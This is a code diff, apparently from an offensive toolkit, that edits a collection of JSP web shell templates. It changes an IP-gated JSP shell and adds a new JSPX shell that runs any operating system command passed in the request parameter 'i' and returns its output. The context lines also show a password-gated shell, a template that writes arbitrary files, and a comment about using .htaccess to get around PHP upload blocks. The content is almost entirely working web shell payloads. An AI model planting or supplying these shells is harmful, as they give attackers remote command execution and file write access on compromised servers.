@@ -38,7 +38,7 @@ if("%s".equals(request.getParameter("pwd")))
 
 jspShellWithIP = '''
 <%
-if(request.getRemoteAddr().equals("%s"))
+if("%s".equals(request.getRemoteAddr()))
 {
     java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
     int a = -1;
@@ -62,6 +62,26 @@ jspWriteFile = '''
     }
     new java.io.FileOutputStream(request.getParameter("f")).write(baos.toByteArray());
 %>
+'''
+
+jspx = '''
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="2.0">
+<jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"/>
+<jsp:directive.page import="java.util.*"/>
+<jsp:directive.page import="java.io.*"/>
+<jsp:scriptlet><![CDATA[
+
+java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+int a = -1;
+byte[] b = new byte[2048];
+out.print("<pre>");
+while((a=in.read(b))!=-1) {
+    out.println(new String(b));
+}
+
+]]>
+</jsp:scriptlet>
+</jsp:root>
 '''
 
 # when can not upload php but can upload .htaccess
